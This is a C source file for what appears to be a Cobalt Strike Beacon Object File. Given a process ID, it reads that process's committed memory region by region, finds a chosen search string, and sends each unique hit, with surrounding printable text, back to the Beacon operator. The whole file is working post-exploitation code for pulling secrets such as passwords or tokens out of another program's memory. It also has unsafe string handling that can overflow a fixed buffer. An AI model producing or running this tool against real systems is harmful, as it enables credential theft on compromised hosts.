#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "beacon.h"

#define BUFFER_SIZE 100
#define MAX_UNIQUE_STRINGS 50

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI VOID WINAPI KERNEL32$GetSystemInfo(LPSYSTEM_INFO lpSystemInfo);
WINBASEAPI WINBOOL WINAPI KERNEL32$ReadProcessMemory(HANDLE  hProcess, LPCVOID lpBaseAddress, LPVOID  lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesRead);
WINBASEAPI SIZE_T WINAPI KERNEL32$VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT PCHAR __cdecl MSVCRT$strstr(const char *haystack, const char *needle);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
DECLSPEC_IMPORT char * __cdecl MSVCRT$strcpy(char * __restrict__ __dst, const char * __restrict__ __src);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *_Str1,const char *_Str2);

int IsPrintableASCII(char ch) {
    return ch >= 32 && ch <= 126;
}

void SearchStringInProcessMemory(DWORD processId, const char* searchString) {
    
    char foundStrings[MAX_UNIQUE_STRINGS][66];
    int numFoundStrings = 0;

    formatp obj;
    int len = 2048;
    BeaconFormatAlloc(&obj, len);

    HANDLE processHandle = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (processHandle == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to open process with ID %lu.", processId);
        return;
    }

    SYSTEM_INFO sysInfo;
    KERNEL32$GetSystemInfo(&sysInfo);

    MEMORY_BASIC_INFORMATION memInfo;
    char buffer[BUFFER_SIZE];

    char* currentAddress = (char*)sysInfo.lpMinimumApplicationAddress;

    while (KERNEL32$VirtualQueryEx(processHandle, currentAddress, &memInfo, sizeof(memInfo)) == sizeof(memInfo)) {

        if (memInfo.State == MEM_COMMIT && memInfo.Protect != PAGE_NOACCESS) {
            SIZE_T bytesReadTotal = 0;

            while (bytesReadTotal < memInfo.RegionSize) {
                
                SIZE_T bytesToRead = min(BUFFER_SIZE, memInfo.RegionSize - bytesReadTotal);
                SIZE_T bytesRead;
                
                if (KERNEL32$ReadProcessMemory(processHandle, currentAddress + bytesReadTotal, buffer, bytesToRead, &bytesRead) && bytesRead > 0) {

                    char* found = MSVCRT$strstr(buffer, searchString);
                    while (found != NULL) {

                        // get 30 chars of printable characters around search string
                        size_t startPos = (found > buffer + 30) ? found - buffer - 30 : 0;
                        size_t endPos = (found + MSVCRT$strlen(searchString) + 30 < buffer + bytesRead) ? found - buffer + MSVCRT$strlen(searchString) + 30 : bytesRead;

                        // extract the substring from the buffer around the found position
                        char printableChars[66];
                        size_t printableCharsIndex = 0;

                        for (size_t i = startPos; i < endPos; ++i) {
                            if (IsPrintableASCII(buffer[i])) {
                                printableChars[printableCharsIndex++] = buffer[i];
                            }
                        }

                        printableChars[printableCharsIndex] = '\0';

                        // check if string is unique to array
                        int isUnique = 1;
                        for (int i = 0; i < numFoundStrings; ++i) {
                            if (MSVCRT$strcmp(foundStrings[i], printableChars) == 0) {
                                isUnique = 0;
                                break;
                            }
                        }

                        if (isUnique && numFoundStrings < MAX_UNIQUE_STRINGS) {
                            MSVCRT$strcpy(foundStrings[numFoundStrings++], printableChars);
                            BeaconFormatPrintf(&obj, "[+] Search string \"%s\" FOUND:   %s\n", searchString, printableChars);
                        }

                        // search next occurance 
                        found = MSVCRT$strstr(found + 1, searchString);
                    }
                } else {
                    //BeaconFormatPrintf(&obj,"[-] Failed reading process memory\n");
                    break;
                }

                bytesReadTotal += bytesRead;
            }
        }
        // next mem region
        currentAddress = (char*)memInfo.BaseAddress + memInfo.RegionSize;
    }

    KERNEL32$CloseHandle(processHandle);

    int outSize = 0;
    char* dataOut = BeaconFormatToString(&obj, &outSize);
    BeaconOutput(CALLBACK_OUTPUT, dataOut, outSize);

    BeaconFormatFree(&obj);
    return;
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    int pid = BeaconDataInt(&parser);
    char* searchString = BeaconDataExtract(&parser, NULL);

    SearchStringInProcessMemory(pid, searchString);
}
